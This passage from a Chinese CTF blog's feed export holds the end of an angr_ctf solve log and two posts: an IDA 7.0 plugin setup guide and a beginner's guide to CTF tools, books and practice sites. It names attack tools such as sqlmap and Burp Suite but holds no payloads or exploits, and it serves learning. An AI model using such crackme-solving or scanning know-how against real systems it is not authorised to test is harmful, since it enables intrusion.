class="number">0</span>]</span><br><span class="line">    solution0 = <span class="built_in">format</span>(solution_state.se.<span class="built_in">eval</span>(password0),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    solution1 = <span class="built_in">format</span>(solution_state.se.<span class="built_in">eval</span>(password1),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    solution2 = <span class="built_in">format</span>(solution_state.se.<span class="built_in">eval</span>(password2),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    solution = solution0+<span class="string">&quot; &quot;</span>+solution1+<span class="string">&quot; &quot;</span>+solution2</span><br><span class="line">    print(solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;time:&#x27;</span>,<span class="built_in">round</span>(time.clock()-t,<span class="number">2</span>),<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="0x04-angr-symbolic-stack"><a href="#0x04-angr-symbolic-stack" class="headerlink" title="0x04 angr_symbolic_stack"></a>0x04 angr_symbolic_stack</h1><p>这个题如果按正常逆向逻辑的话就是超级无敌大水题（</p><p>然而考虑到这是angr题库，于是乖乖去看挖空exp的注释，发现花了很大篇幅在讲栈结构（还是AT&amp;T的汇编orz 看惯了Intel汇编的人表示不习惯）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For this challenge, we want to begin after the call to scanf. Note that this</span></span><br><span class="line"><span class="comment"># is in the middle of a function.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This challenge requires dealing with the stack, so you have to pay extra</span></span><br><span class="line"><span class="comment"># careful attention to where you start, otherwise you will enter a condition</span></span><br><span class="line"><span class="comment"># where the stack is set up incorrectly. In order to determine where after</span></span><br><span class="line"><span class="comment"># scanf to start, we need to look at the dissassembly of the call and the</span></span><br><span class="line"><span class="comment"># instruction immediately following it:</span></span><br><span class="line"><span class="comment">#   sub    $0x4,%esp</span></span><br><span class="line"><span class="comment">#   lea    -0x10(%ebp),%eax</span></span><br><span class="line"><span class="comment">#   push   %eax</span></span><br><span class="line"><span class="comment">#   lea    -0xc(%ebp),%eax</span></span><br><span class="line"><span class="comment">#   push   %eax</span></span><br><span class="line"><span class="comment">#   push   $0x80489c3</span></span><br><span class="line"><span class="comment">#   call   8048370 &lt;__isoc99_scanf@plt&gt;</span></span><br><span class="line"><span class="comment">#   add    $0x10,%esp</span></span><br><span class="line"><span class="comment"># Now, the question is: do we start on the instruction immediately following</span></span><br><span class="line"><span class="comment"># scanf (add $0x10,%esp), or the instruction following that (not shown)?</span></span><br><span class="line"><span class="comment"># Consider what the &#x27;add $0x10,%esp&#x27; is doing. Hint: it has to do with the</span></span><br><span class="line"><span class="comment"># scanf parameters that are pushed to the stack before calling the function.</span></span><br><span class="line"><span class="comment"># Given that we are not calling scanf in our Angr simulation, where should we</span></span><br><span class="line"><span class="comment"># start?</span></span><br></pre></td></tr></table></figure><hr><h1 id="（……）"><a href="#（……）" class="headerlink" title="（……）"></a>（……）</h1>]]></content>
      
      
      <categories>
          
          <category> 刷题log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【从无到有】配置IDA7.0</title>
      <link href="p/toolsOf-IDAold/"/>
      <url>p/toolsOf-IDAold/</url>
      
        <content type="html"><![CDATA[<p>最近在折腾新机，旧机有些东西没有备份（。）导致很多东西要重装一遍，顺便记录一下IDA及各插件的安装方法。</p><p>环境是win10，IDA版本为v7.0（<a href="https://www.52pojie.cn/thread-675251-1-1.html">IDA Pro 7.0 绿色版</a>）。</p><p><strong>每个插件带一个下载地址&amp;&amp;安装方法，features摘自各个项目的主页</strong></p><a id="more"></a><h1 id="一切的最开始：改变ida-cfg"><a href="#一切的最开始：改变ida-cfg" class="headerlink" title="一切的最开始：改变ida.cfg"></a>一切的最开始：改变ida.cfg</h1><p>见：<a href="https://github.com/c10udlnk/someFixedConfigs/commit/1dd5561b19f44748c69ed4d556b6d71a5b91916a">修改ida配置文件 · c10udlnk&#x2F;someFixedConfigs@1dd5561</a></p><p>参考《加密与解密（第四版）》P66-68。</p><hr><h1 id="LazyIDA"><a href="#LazyIDA" class="headerlink" title="LazyIDA"></a>LazyIDA</h1><ul><li>项目地址：<a href="https://github.com/L4ys/LazyIDA">https://github.com/L4ys/LazyIDA</a></li><li>安装方法：直接将下载的.py文件放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li></ul><h2 id="features"><a href="#features" class="headerlink" title="features"></a>features</h2><ol><li>在反编译窗口（Hex-Rays Window）中移除函数返回类型。</li><li>在反汇编窗口（Disasm Window）中将数据转换成C++&#x2F;python&#x2F;…类型的不同尺寸数组。</li><li>Disasm Window下，按w复制所在行的地址。</li><li>Hex-Rays Window下，按w复制当前对象的地址，按c复制当前对象的名字，按v移除当前对象的返回类型。</li><li>扫描格式化字符串漏洞。</li></ol><hr><h1 id="findcrypt-yara"><a href="#findcrypt-yara" class="headerlink" title="findcrypt-yara"></a>findcrypt-yara</h1><ul><li>项目地址：<a href="https://github.com/polymorf/findcrypt-yara">https://github.com/polymorf/findcrypt-yara</a></li><li>安装方法：先用pip安装yara-python（注意不是yara），再将.py文件和.rules放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li><li>按<code>ctrl+alt+f</code>快捷键显示findcrypt窗口即为安装成功。</li></ul><p><strong>注意：</strong></p><ol><li>windows下安装yara-python需在IDA_Pro_v7.0_Portable\python27目录下打开cmd，并输入<code>.\python.exe lib\site-packages\pip install yara-python==3.11.0</code>进行安装（安装在外面的python2环境无效）。<blockquote><p><a href="https://blog.csdn.net/szxpck/article/details/107203718">https://blog.csdn.net/szxpck/article/details/107203718</a> 里有对这个问题进行说明，主要的点有：① IDA使用的python版本是python2；② yara-python只有3.11.0版支持python2。</p></blockquote></li><li>如果有报错，尝试：安装Microsoft Visual C++ Compiler for Python 2.7支持库。（在查找问题的时候看到这个，但装完以后没有效果，用了1以后才安装成功，也许这个也要安装？）<blockquote><p>详情见 <a href="https://www.cnblogs.com/mke2fs/p/10938455.html">https://www.cnblogs.com/mke2fs/p/10938455.html</a> 。</p></blockquote></li></ol><h2 id="features-1"><a href="#features-1" class="headerlink" title="features"></a>features</h2><p>寻找加密方法的常数（以发现加密方法）。</p><hr><h1 id="keypatch"><a href="#keypatch" class="headerlink" title="keypatch"></a>keypatch</h1><ul><li>项目地址：<a href="https://github.com/keystone-engine/keypatch">https://github.com/keystone-engine/keypatch</a></li><li>安装方法：先安装keystone引擎，再将下载的.py文件放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li><li>按<code>ctrl+alt+k</code>快捷键显示keypatch窗口即为安装成功。</li></ul><p><strong>注意：</strong></p><p>IDA pro 7.0 绿色版的说明中提到，<img src="/p/toolsOf-IDAold/2.png" alt="IDA 7.0绿色版的说明"><br>keypatch.py的文件也已经被放入plugins文件夹中，直接在IDA_Pro_v7.0_Portable\python27目录下打开cmd，并输入<code>.\python.exe lib\site-packages\pip install keystone-engine</code>安装keystone后即可使用keypatch。</p><h2 id="features-2"><a href="#features-2" class="headerlink" title="features"></a>features</h2><p>直接使用汇编代码修改二进制文件。</p><hr><h1 id="hexlight"><a href="#hexlight" class="headerlink" title="hexlight"></a>hexlight</h1><ul><li>项目地址（看雪-修改版，原版没找到）：<a href="https://bbs.pediy.com/thread-226099.htm">https://bbs.pediy.com/thread-226099.htm</a></li><li>安装方法：直接将下载的.py文件放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li></ul><h2 id="features-3"><a href="#features-3" class="headerlink" title="features"></a>features</h2><p>高亮代码，增加高亮匹配括号</p><hr><h1 id="deREferencing（IDA版本需-7-1，无法安装）"><a href="#deREferencing（IDA版本需-7-1，无法安装）" class="headerlink" title="deREferencing（IDA版本需&gt;&#x3D;7.1，无法安装）"></a>deREferencing（IDA版本需&gt;&#x3D;7.1，无法安装）</h1><ul><li>项目地址：<a href="https://github.com/danigargu/deREferencing">https://github.com/danigargu/deREferencing</a></li><li>安装方法：直接将下载的.py文件放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li></ul><h2 id="features-4"><a href="#features-4" class="headerlink" title="features"></a>features</h2><p>让寄存器窗口和栈窗口的长得像一些gdb调试的窗口（增强窗口显示）。</p><hr><h1 id="IDAGolangHelper"><a href="#IDAGolangHelper" class="headerlink" title="IDAGolangHelper"></a>IDAGolangHelper</h1><ul><li>项目地址：<a href="https://github.com/sibears/IDAGolangHelper">https://github.com/sibears/IDAGolangHelper</a></li><li>安装方法：直接将下载的go_entry.py文件和GO_Utils文件夹放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li><li>打开Go编译的二进制文件时左边函数名为”runtime_”等有规律的的名字即为安装成功。</li></ul><h2 id="features-5"><a href="#features-5" class="headerlink" title="features"></a>features</h2><p>修饰Go函数名和变量名，帮助逆向Go（</p><hr><h1 id="Ponce"><a href="#Ponce" class="headerlink" title="Ponce"></a>Ponce</h1><ul><li>项目地址：<a href="https://github.com/illera88/Ponce/releases/tag/v0.3">https://github.com/illera88/Ponce/releases/tag/v0.3</a></li><li>安装方法：把对应平台的对应IDA版本文件夹中的两个dll文件放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li></ul><h2 id="features-6"><a href="#features-6" class="headerlink" title="features"></a>features</h2><p>angr和Triton的可视化辅助。</p><hr><h1 id="qira"><a href="#qira" class="headerlink" title="qira"></a>qira</h1><ul><li>官网：<a href="http://www.qira.me/">http://www.qira.me/</a></li><li>安装方法：按照官网方法安装以后（ubuntu 18.04见<a href="https://c10udlnk.top/p/toolsOf-Qira-on-ubuntu-1804/">【从无到有】qira在Ubuntu 18.04下的安装&amp;使用 | c10udlnk_Log</a>），在<code>qira-1.3\ida\bin</code>下找到<code>qira_ida66_windows.p64</code>和<code>qira_ida66_windows.plw</code>文件，并放入IDA_Pro_v7.0_Portable\plugins文件夹中。</li></ul><p><img src="/p/toolsOf-IDAold/image-20201219215758039.png"></p><h2 id="features-7"><a href="#features-7" class="headerlink" title="features"></a>features</h2><p>见官网，总之是一个能跟IDA搭配的可回溯调试器。</p><hr><p>没有了，有再补充吧0v0。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> zero2one/入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF：从0到1 -&gt; zero2one</title>
      <link href="p/blogsFor-CTF-Starters/"/>
      <url>p/blogsFor-CTF-Starters/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本篇blog首发<strong>0xffff论坛</strong>（<a href="https://0xffff.one/d/769">CTF：从0到1-&gt;zero2one - 0xFFFF</a>），中间有各位大佬补充，集成在个人博客这里。是一点CTF的入门心得吧，希望能给想玩CTF的小朋友们一点帮助。</p><p>这里还只是个划水摸鱼的萌新（捂头）有什么写错的地方烦请大佬们多多补充谢谢0v0</p></blockquote><a id="more"></a><h1 id="0x01-关于CTF"><a href="#0x01-关于CTF" class="headerlink" title="0x01 关于CTF"></a>0x01 关于CTF</h1><h2 id="Ⅰ-一点简介"><a href="#Ⅰ-一点简介" class="headerlink" title="Ⅰ. 一点简介"></a>Ⅰ. 一点简介</h2><p>CTF（Capture The Flag，夺旗赛），就是通过程序分析、攻防对抗等形式，从比赛平台的题目中得到一串具有一定格式的字符串（被称为flag）或其他内容，并将其提交到平台上以夺得分数。</p><h2 id="Ⅱ-亿点简介"><a href="#Ⅱ-亿点简介" class="headerlink" title="Ⅱ. 亿点简介"></a>Ⅱ. 亿点简介</h2><p>详细简介这东西，前人有简介的话当然引用前人的了（捂头跑路）。感觉目前来说看到最完整的介绍要数CTFHub里的了 <del>（要不是因为要去拿彩蛋的flag估计我也不会看到这些介绍hhh）</del> 。</p><p>CTF简介：<a href="https://writeup.ctfhub.com/Skill/CTF%E5%9F%BA%E7%A1%80/22435.html">CTF简介 | CTFHub</a></p><p>关于CTF的竞赛模式：<a href="https://writeup.ctfhub.com/Skill/CTF%E5%9F%BA%E7%A1%80/44044.html">竞赛模式 | CTFHub</a></p><p>关于CTF的比赛形式：<a href="https://writeup.ctfhub.com/Skill/CTF%E5%9F%BA%E7%A1%80/52169.html">比赛形式 | CTFHub</a></p><p>关于CTF的题目类型：<a href="https://writeup.ctfhub.com/Skill/CTF%E5%9F%BA%E7%A1%80/63374.html">题目类型 | CTFHub</a></p><h1 id="0x02-从入门到…"><a href="#0x02-从入门到…" class="headerlink" title="0x02 从入门到…"></a>0x02 从入门到…</h1><h2 id="Ⅰ-新手教程"><a href="#Ⅰ-新手教程" class="headerlink" title="Ⅰ. 新手教程"></a>Ⅰ. 新手教程</h2><h3 id="1）选择一个主攻方向"><a href="#1）选择一个主攻方向" class="headerlink" title="1）选择一个主攻方向"></a>1）选择一个主攻方向</h3><p>在读完上面的亿点简介（尤其是题目类型）以后，可以<strong>试图寻找自己对哪个方向更感兴趣</strong>（web，reverse&#x2F;逆向，pwn&#x2F;二进制，crypto&#x2F;密码学）。为什么不选misc呢？因为杂项实在是太杂，建议团队三个人都或多或少地刷一下，<del>华师CTF新生赛里杂项类是为数不多能做出来的题目了（捂头跑）</del>。</p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602829881-697439-20201016143101.png" alt="CTF方向分类"></p><p>我的话目前是个摸鱼的逆向手，所以对逆向方面比较熟悉（吧，打算往pwn方向延伸。</p><p>对几个方向的一点点理解是：</p><ul><li><p>感觉 <em><strong>web</strong></em> 相当于前端的杂项，听说web包括的方面很多很杂，做起来令人头大（想问具体的就去敲web手吧[甩锅]）。</p></li><li><p><em><strong>逆向</strong></em> 上我感觉算是比较简单也比较累的一个方向，入门的话只要能读得懂C&#x2F;C++源代码就完全ojbk，后期可能需要人肉反汇编&amp;反编译，<del>做题的时候十分需要感受宁静hhhh</del>。</p></li><li><p><em><strong>pwn</strong></em> 则是简单逆向+漏洞利用，入门可能比较难（？<del>但是新生赛里说不定就有输入十六个b就能出flag的究极简单题[手动狗头]</del>），毕竟需要在读懂程序逻辑（一般这里的程序逻辑没逆向那么难）以后，发现能利用的漏洞（比如堆栈溢出&#x2F;重复free等），如果对计算机内部处理比较感兴趣的同学可以试试？</p></li><li><p><em><strong>密码学</strong></em> 感觉是万物归宗（x），后期无论做什么题都有可能遇到密码学（比如上次ciscn逆向到最后是一道TEA解密的问题），very需要数论基础。</p></li></ul><p>组队的时候，可以先组人再分方向，也可以通过方向来选人，最理想的状态是三人方向不同，优势互补。</p><hr><p><strong>关于web方向的入门感谢<a href="http://fxizenta.design/">@Fxizenta</a> 大佬补充【把大佬回复贴回来，原回复指路帖子6L】</strong></p><blockquote><p><em><strong>隔壁的摸鱼web来补充一下web入门</strong></em></p><p><strong>0x00 入门建议</strong></p><p>web方向应该算是比较难入门的方向（尤其对于无基础的萌新），完全无基础的同学建议从<a href="https://www.w3school.com.cn/">w3school</a>开始吧，期间也可以做一些简单的题（题库上面的dalao说的都挺不错的），学习web方向如果没有学习过前端、协议、命令行等基础的知识的话，在前期是挺任意有错败感的，这里建议在做题中思考了很长时间发现完全没有思路，建议可以直接去看write up，在从wp中学习dalao们的思路，<strong>很重要的一点是</strong>，在wp中有什么发现自己不明白的，建议善用搜索引擎，把题目的思路了解清楚。</p><p><strong>0x01 web常用工具</strong></p><p><strong>1. Burp Suite</strong></p><p>web题常用工具，功能十分强大，常用于用于抓包、发包、爆破，可以在官网下载到社区版</p><p>bp的配置和简单功能解释：<a href="https://blog.csdn.net/u011723630/article/details/80315507">https://blog.csdn.net/u011723630/article/details/80315507</a></p><p><strong>2. kali</strong></p><p>Kali 是一个基于 Debian 的 Linux 发行版。它的目标就是为了简单：在一个实用的工具包里尽可能多的包含渗透和审计工具。Kali 实现了这个目标。大多数做安全测试的开源工具都被囊括在内。</p><p>kali下载： <a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></p><p><strong>3. sqlmap</strong></p><p>用于sql注入，功能十分强大包含了盲注，布尔注入，cookie注入等等常见注入方式的扫描和利用，还可以自己定制绕过方法，绕过黑白名单限制。下载github上可以找到</p><p><strong>4. dirsearch</strong></p><p>用于站点扫描，包括扫秒常见的.git,.svn,.apk等备份文件，以及域名下的子目录（不过有个缺点是他只扫描常见的命名规则下的子目录名，所以还是有一定的局限性）。下载github上有</p><p><strong>5. hackbar</strong></p><p>一个浏览器插件，虽然他的功能bp都有，但是对比起bp他有一个巨大优势就是方便（老懒狗了），f12就可以开始使用，提供post和简单编码解码的功能。在Chrome和Firefox的插件商城都可以找到。<strong>ps：</strong>访问Chrome插件商城需要魔法（狗头）</p><p><strong>0x02 学习推荐</strong></p><p><strong>1. ctfwiki</strong></p><p>据说每一位ctf选手都是从这里开始的，不止web选手哦，其他方向的选手也可以去看看</p><p><a href="https://github.com/ctf-wiki/ctf-wiki">https://github.com/ctf-wiki/ctf-wiki</a></p><p><a href="https://wiki.x10sec.org/">https://wiki.x10sec.org/</a></p><p><strong>2. 打好基础</strong></p><p>无基础直接莽上来的话，你可能会完全一头雾水，如果是完全没有基础的同学建议先学C&#x2F;C++,一起还是从先学会一个编程语言的基础使用开始吧，然后就可以开始学会一个脚本语言（如python），学习php（至少要看得懂），还可以看看端口知识，传输协议知识等等，最重要的一点，要变做题边学习，如果单单把重心放在flag，而不是做题的学习过程，那么你会失去很多，也会失去打ctf最珍贵的东西。</p><p>最后附上最近刚刚结束的Tencent CTF中的奖励于你我共勉吧<br> <img src="https://static.0xffff.one/assets/files/2020-10-16/1602832895-674209-image.png" alt="TCTF - Prize"></p></blockquote><hr><h3 id="2）边练边学，刷题入门"><a href="#2）边练边学，刷题入门" class="headerlink" title="2）边练边学，刷题入门"></a>2）边练边学，刷题入门</h3><p>CTF比赛过程中跟其他比赛最大的不同点就是<strong>能在互联网查找资料，赛后还（或许）能搜到一些题目的wp（即write up，类似于答案解析）</strong>。</p><p>如果已经发现了自己感兴趣的方向，那必然是极好的，接下来就可以在一些刷题网站（如CTFHub、攻防世界、Bugku CTF等，在0x03中会有详细介绍）中，选择该方向的题目进行练习。刚开始的时候，或许还不懂面对题目应该做什么，那么可以选择在网上找这道题目的wp（如这道题目在攻防世界上，名为easyre，那么可以搜索“攻防世界 easyre”，就能看到它的解题思路）。</p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602829869-597928-20201016143012.png" alt="题目wp搜索"></p><p>当然，如果没有找到方向也不用担心，可以各个方向的题都试试跟着wp做一下，或许能在做题的过程中发现兴趣点呢hhh。</p><p><strong>初学者可以直接跟着wp复现得到flag，但跟着做的过程中也要学到做题的思路和思考方向。</strong> 在学了一些题目以后，就可以尝试自己做一些题啦，能做出就成就感up，没做出就继续看wp o(<em>￣▽￣</em>)ブ。当然，也不是每道题都有wp，但不用担心，这些网站在新手区放的经典题基本上都会有wp的。</p><p><strong>CTF的学习过程其实更像是积累经验的过程</strong>，在做每一道题、打每一场比赛的赛中和赛后能学到新的知识点，也能知道自己在什么方面有所不足、哪些点因为粗心忽略掉了。 <del>（就像音游一样都要多练</del></p><p>同时，也别忘了很重要的 <strong>“自造轮子”</strong> ，CTF是用自己的电脑进行比赛的，也就是说会很依赖本地的库和脚本。万一碰到不能去互联网查资料的&amp;#?%@比赛（真的存在XD），就意味着你需要用本地脚本进行某个密码算法（比如TEA）的解密，如果没有本地轮子就只能现打了，还是很费时间的orz。<br>（p.s. 在找不到在线解密的网站时，有本地的解密代码也很方便）</p><p><em><strong>比赛入门强推：华师CTF新生赛</strong></em></p><h2 id="Ⅱ-必先利其器"><a href="#Ⅱ-必先利其器" class="headerlink" title="Ⅱ. 必先利其器"></a>Ⅱ. 必先利其器</h2><p>无论哪个方向，写脚本用的语言建议首选Python。<del>（Python是世界上最好的语言！！）</del></p><p>Reverse：</p><ul><li>IDA pro（yyds！反汇编+反编译必备；ida使用小技巧：<a href="https://xz.aliyun.com/t/4205">IDA Pro7.0使用技巧总结</a>）</li><li>Ollydbg（简称OD，一个动态调试工具）</li><li>WinHex或者010 editor（读||复制粘贴十六进制机器码的工具）</li><li>Ghidra（一个支持反编译mips64的工具）</li><li>PEiD或者ExEinfo PE（查壳工具）</li><li>uncompyle6（.pyc反编译为.py的工具；<a href="https://www.cnblogs.com/pcat/p/11625300.html">uncompyle6安装使用方法</a>）</li><li>pintool（二进制插桩找输入；<a href="https://github.com/wagiro/pintool">Pintool</a>或者<a href="https://github.com/ChrisTheCoolHut/PinCTF">PinCTF</a>；<del>有坑，目前还没折腾出来orz 有成功的小伙伴拍我一下谢谢！</del> 2020.11 update：装上了！才发现有坑是因为没有升级wsl的问题（捂头。整理于&#x3D;&gt;<a href="https://c10udlnk.top/p/toolsOf-Pintool/">【从无到有】Pintool安装&amp;使用</a>）</li><li>angr（超强的符号执行引擎，vm题利器(x)；项目地址：<a href="https://github.com/angr/angr">angr</a>，例题：<a href="https://github.com/angr/angr-doc">angr-doc</a>，题库：<a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>，对于这个题库自己写了个<a href="https://c10udlnk.top/p/logFor-Angr-CTF/">angr_ctf刷题小记</a>，非题解）</li><li>unicorn（CPU仿真器框架，提供hook；项目地址：<a href="https://github.com/unicorn-engine/unicorn">unicorn-engine</a>）</li><li>…（想到什么再补好了XD</li></ul><p>Pwn：</p><ul><li>pwntools（pwn必备；<a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/intro.html">中文文档</a>）</li><li>gdb（动态调试；<a href="https://blog.csdn.net/aptx4869_li/article/details/81566541">插件控制</a>）</li><li>…</li></ul><p>简单加解密？（misc）：</p><ul><li><a href="http://ctf.ssleye.com/">CTF在线工具</a></li><li><a href="https://www.ssleye.com/">SSL在线工具</a></li><li><a href="https://www.splitbrain.org/services/ook">Brainf**k&#x2F;Ook解密</a></li><li><a href="https://github.com/Acmesec/CTFCrackTools">CTFCrackTools</a></li><li><a href="https://github.com/yifeng-lee/ctftools">ctftools</a></li></ul><p>别的方向暂时还无，建议搜索引擎走起QvQ</p><h1 id="0x03-安利一些前人的肩膀"><a href="#0x03-安利一些前人的肩膀" class="headerlink" title="0x03 安利一些前人的肩膀"></a>0x03 安利一些前人的肩膀</h1><h2 id="Ⅰ-一些书"><a href="#Ⅰ-一些书" class="headerlink" title="Ⅰ. 一些书"></a>Ⅰ. 一些书</h2><p><strong>【读过给“o”标志，简单说一下读后感；未读过给“x”标志，简介从网络上搬过来，仅供参考。】</strong></p><ol><li><p>《CTF特训营：技术详解、解题方法与竞赛技巧》_<strong>【o】【全方向】</strong>_</p><p>这本书里包括Web、Reverse、PWN、Crypto、APK、IoT六个部分，据说是面向初学者的一本书。但是从阅读体验来看，<strong>感觉不太适合一点都没接触过CTF的小白（连一道题都没做过的这种）</strong>，至少在看到的逆向和pwn部分是这样。</p><p>不过，它虽然没有手把手带你入门的详细步骤，但有的是<strong>干货max</strong>。如果读者是做过一点题的咸鱼选手（比如我），就会感觉学到了超多，里面介绍和总结了很多实用的技巧和某一部分的详细题型。很多方法就是提一嘴，让你知道有这个东西，但具体该怎么用、用的时候该注意什么，就得自己去领悟了。</p><p>总结：感觉本书适合 <em>跟着wp做了一些题目并能独立做出几道的初学者</em> 及 _想要往别的方向发展的现役选手_。</p><p>&#x2F;* 本书勘误表：<a href="https://github.com/FlappyPig/CTF_SPECIAL_TRAINING_CAMP">https://github.com/FlappyPig/CTF_SPECIAL_TRAINING_CAMP</a> *&#x2F;</p></li><li><p>《从0到1:CTFer成长之路》_<strong>【o】【全方向】</strong>_</p><p>2020.12 update：是NU1L战队出的一本入门书。从读完的逆向part来说，感觉比起上一本而言这个才是<strong>real从0到1</strong>：页数++++，0是真的0，1也是真的1（目前只能理解到0-&gt;0.9的样子，tcl）。<br>先说从0的部分，很多基础操作都是一步步带着走的，相信<strong>零基础也能毫无难度的上手</strong>。而且本书还有配套练习的crackme，有点小型wp复现的感觉了。同时<strong>干货也有很多</strong>，ida部分推荐了一些实用插件+其他还安利了很多挺有用的工具。btw，提一下它的angr起步讲的真的很详细，至少让我get到了几个常用的优化点+认识到了看文档的重要性。<br>然后是到1的部分，感觉有很多巧妙的高级操作，往上进阶的部分讲了很多（虽然书里说是说“冰山一角”）。<del>至于说到0.9是因为自制pintool那里暂时不太能理解，菜鸡还是先用着别人的开源pintool吧（捂头）</del><br>总结：这本书强推给 <em>零基础的小朋友们</em> （至少逆向是这样的），并且建议在 <em>增强理论学习的同时可以跟着实践一下</em> ，效果更佳。</p><p>&#x2F;* 本书勘误表：<a href="https://book.nu1l.com/tasks/#/pages/others/bugs?id">https://book.nu1l.com/tasks/#/pages/others/bugs?id</a> *&#x2F;</p></li><li><p>《加密与解密》_<strong>【o】【Reverse &amp;&amp; PWN】</strong>_</p><p><strong>加解密yyds！！绝对是值得反复读的好书&#x3D;v&#x3D;</strong></p><p>虽然有点厚都是跳着看的hhh，但是打基础真的很棒。</p><p>推荐阅读路线（亲测）是基础篇-&gt;调试篇（了解学习IDA和OD&#x2F;WinDbg&#x2F;…的大致用法）-&gt;解密篇（大概看看会出到的密码算法）-&gt;脱壳篇&amp;&amp;保护篇（感觉主要是脱壳和反调试）-&gt;PE部分（走基础）-&gt;剩下没看的。</p><p>&#x2F;* 本书勘误表：<a href="https://bbs.pediy.com/thread-247429.htm">https://bbs.pediy.com/thread-247429.htm</a> *&#x2F;</p></li><li><p>《逆向工程权威指南（<a href="https://beginners.re/">RE4B</a>）》_<strong>【x】【Reverse】</strong>_</p><p>【本书专注于软件的逆向工程，是写给初学者的一本经典指南。全书共分为12个部分，共102章，涉及X86&#x2F;X64、ARM&#x2F;ARM-64、MIPS、Java&#x2F;JVM等重要话题，堪称是逆向工程技术百科全书。除了详细讲解，本书来给出了很多习题来帮助读者巩固所学的知识，附录部分给出了习题的解答。】</p><p>是一本在很多逆向方向入门帖里都会安利的书hhhh</p></li><li><p>《汇编语言》_<strong>【o】【Reverse &amp;&amp; PWN】</strong>_</p><p>这本书我觉得是汇编入门宝典，虽然讲的是16位的古早8086CPU，但是把汇编的机制搞懂了以后，再看看x86&#x2F;64和8086的区别就可以迅速用到题目里面。（比如vm的反汇编）</p><p>我觉得在学习汇编上跟别的语言不同的是，<strong>最重要不是语法，而是计算机程序的运行过程、数据存储布局等底层的东西</strong> ，而这本书在这方面讲的很通俗易懂不枯燥，推荐xn。</p></li><li><p>《图解密码技术》_<strong>【o】【Crypto】</strong>_</p><p>（大致看了一些部分）就是一本很有趣的讲密码学的书！建议从前言看起发现彩蛋√</p><p>因为去年刚开学那会是抱着随便了解了解的心态看的，所以可能对里面专业的东西没怎么记得住，为了避免误解我还是搬一段简介吧↓</p><p>【本书以图配文的形式，详细讲解了6种最重要的密码技术：对称密码、公钥密码、单向散列函数、消息认证码、数字签名和伪随机数生成器。第一部分讲述了密码技术的历史沿革、对称密码、分组密码模式（包括ECB、CBC、CFB、OFB、CTR）、公钥、混合密码系统。第二部分重点介绍了认证方面的内容，涉及单向散列函数、消息认证码、数字签名、证书等。第三部分讲述了密钥、随机数、PGP、SSL&#x2F;TLS 以及密码技术在现实生活中的应用。】</p><p><strong>2021.06 upd</strong>：上个月又把这本书摸出来补完了，感觉这本书偏向科普类型，涉及的范围很广但是没有很深入地讲（比如具体加密实现什么的），吸引兴趣倒是很可以hhh。</p></li><li><p>《白帽子讲web安全》_<strong>【x】【Web】</strong>_</p><p>【在互联网时代，数据安全与个人隐私受到了前所未有的挑战，各种新奇的攻击技术层出不穷。如何才能更好地保护我们的数据？本书将带你走进Web安全的世界，让你了解Web安全的方方面面。黑客不再变得神秘，攻击技术原来我也可以会，小网站主自己也能找到正确的安全道路。大公司是怎么做安全的，为什么要选择这样的方案呢？你能在本书中找到答案。详细的剖析，让你不仅能“知其然”，更能“知其所以然”。</p><p>本书是根据作者若干年实际工作中积累下来的丰富经验而写成的，在解决方案上具有极强的可操作性，深入分析了各种错误的解决方案与误区，对安全工作者有很好的参考价值。安全开发流程与运营的介绍，对同行业的工作具有指导意义。】</p><p>给完全没有了解的隔壁web方向推荐一波&lt;(＿　＿)&gt;</p></li><li><p>CSAPP（深入理解计算机系统） <em><strong>【o】【Reverse &amp;&amp; PWN】</strong></em></p><p>推一个大佬们的学习指南&#x2F;资源汇总：<a href="https://0xffff.one/d/684">【CMU-CSAPP】2015 CMU 15-213 CSAPP资源汇总</a></p><p>同样是没有折腾完的一本书（瘫）想对计算机底层方面有更深层次了解的朋友们可以试着阅读一番&#x3D;v&#x3D;</p></li></ol><h2 id="Ⅱ-一些网站"><a href="#Ⅱ-一些网站" class="headerlink" title="Ⅱ. 一些网站"></a>Ⅱ. 一些网站</h2><ol><li><p><a href="https://ctf.scnu.edu.cn/library/knowledge">华师CTF</a></p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602829742-473567-20201016142841.png" alt="华师CTF"></p><p>是一个宝藏集合网站！不仅仅是一个报名网站（去年），里面的知识清单&amp;训练场也大有乾坤，建议都扫一遍&#x3D;v&#x3D;</p></li><li><p><a 